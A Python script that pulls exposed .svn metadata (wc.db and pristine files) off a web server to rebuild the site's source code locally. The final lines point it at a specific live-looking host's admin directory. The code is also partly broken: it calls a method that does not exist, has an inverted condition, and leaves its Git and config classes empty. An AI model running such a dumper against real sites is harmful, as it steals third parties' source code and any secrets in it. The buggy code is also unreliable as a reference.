#!/usr/bin/env python
# encoding=utf-8
#codeby     道长且阻
#email      ydhcui@/QQ664284092


import requests
import sqlite3
import os
import re

class Dumps(object):
    def __init__(self,url,mut):
        self.session = requests.Session()
        self.basemut = mut
        self.baseurl = url.split(mut)[0]
        self.basedir = url.split('/')[2].replace(':','-')+'/'

    def get(self,filename):
        url = self.baseurl + self.basemut + filename
        try:
            print('[+]Get %s'%url)
            return self.session.get(url).content
        except Exception as e:
            print('[-]Error %s'%e)

    def write(self,path,content):
        mutpath = self.basedir + path
        folder = '/'.join(mutpath.split('/')[:-1])
        if not os.path.exists(folder):
            os.makedirs(folder)
        print('  [-]Write %s'%mutpath)
        with open(mutpath,'wb') as f:
            f.write(content)
        return mutpath

class Svn(Dumps):
    def __init__(self,url):
        Dumps.__init__(self,url,'.svn')

    def readwcdb(self):
        mutpath = self.write('/wc.db',self.get('/wc.db'))
        wcdb = sqlite3.connect(mutpath)
        cursor = wcdb.cursor()
        cursor.execute("SELECT local_relpath,checksum FROM NODES WHERE checksum != '';")
        for local_relpath,checksum in cursor.fetchall():
            #$sha1$64fcc069a2147e64d9cc5cd0d93116c12b9beda9
            filename = '/pristine/'+checksum[6:8]+'/'+checksum[6:] + '.svn-base'
            self.write(local_relpath,self.get(filename))

    def readentries(self,res=None):
        if res:
            res = self.get('/entries')
        for f in re.findall(r'\n(.*?)\nfile',res):
            if f:
                self.write(f,self.get('/text-base/'+f+'.svn-base'))
        for d in re.findall(r'\n(.*?)\ndir',res):
            res = self.get(d+'/.svn/entries')
            self.readentries(res)

class Git(Dumps):
    def __init__(self,url):
        Dumps.__init__(self,url,'.git')

class WebXml(Dumps):pass
class WebConfig(Dumps):pass

svn = Svn('http://mall.gmcciot.com:8010/admin/.svn/')
svn.readdb()